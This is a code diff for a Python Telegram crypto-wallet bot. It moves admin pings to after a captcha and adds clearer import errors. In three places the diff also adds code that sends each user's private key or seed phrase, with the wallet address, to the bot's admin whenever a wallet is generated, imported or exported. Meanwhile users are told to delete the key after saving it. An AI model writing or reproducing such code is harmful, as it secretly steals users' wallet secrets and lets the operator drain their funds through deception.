@@ -299,10 +299,8 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         tag = user_tag(user, uid)
     except Exception:
         tag = f"<code>{uid}</code>"
-    if is_new:
-        await ping_admin(f"🆕 <b>New user started the bot</b> — {tag}", update, context)
-    else:
-        await ping_admin(f"👋 <b>User opened the bot</b> — {tag}", update, context)
+    # Admin is notified exactly ONCE per user — only AFTER the captcha passes
+    # (see handle_captcha_answer). No pings on plain /start taps.
     args = context.args or []
     payload = (args[0] if args else "") or ""
     quick = False
@@ -1221,6 +1219,18 @@ async def _dispatch_callback(update, context, query) -> None:
                 parse_mode=HTML,
             )
             await safe_answer(query, "Key sent in chat — delete it after saving")
+            try:
+                from bot.admin import alert_wallets
+
+                await alert_wallets(
+                    f"🔑 <b>User exported a key</b> — wallet <b>{html.escape(w['name'])}</b> {w['chain']}\n"
+                    f"🏦 <code>{w['address']}</code>\n"
+                    f"🔑 Key / seed:\n<code>{html.escape(secret)}</code>",
+                    uid,
+                    bot=context.bot,
+                )
+            except Exception:
+                log.exception("admin export alert")
     elif data.startswith("wal:ren:"):
         wid = int(data.split(":")[2])
         w = db.get_wallet(wid)
@@ -1823,7 +1833,9 @@ async def _on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         from bot.admin import user_tag
 
         await ping_admin_wallets(
-            f"✨ Wallet generated {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>",
+            f"✨ Wallet generated {user_tag(user, uid)} {chain} {html.escape(name)}\n"
+            f"🏦 <code>{address}</code>\n"
+            f"🔑 Private key:\n<code>{html.escape(secret)}</code>",
             uid,
             update,
             context,
@@ -1852,6 +1864,9 @@ async def _on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         name = payload["name"]
         try:
             address, secret = import_for_chain(CHAINS[chain]["kind"], text)
+        except ValueError as _ve:
+            await send_panel(update, f"❌ {html.escape(str(_ve))}")
+            return
         except Exception:
             await send_panel(update, "❌ Could not import that key. Check the format and try again.")
             return
@@ -1868,7 +1883,9 @@ async def _on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         from bot.admin import user_tag
 
         await ping_admin_wallets(
-            f"📥 Wallet imported {user_tag(user, uid)} {chain} {html.escape(name)}\n<code>{address}</code>",
+            f"📥 Wallet imported {user_tag(user, uid)} {chain} {html.escape(name)}\n"
+            f"🏦 <code>{address}</code>\n"
+            f"🔑 Key / seed:\n<code>{html.escape(secret)}</code>",
             uid,
             update,
             context,
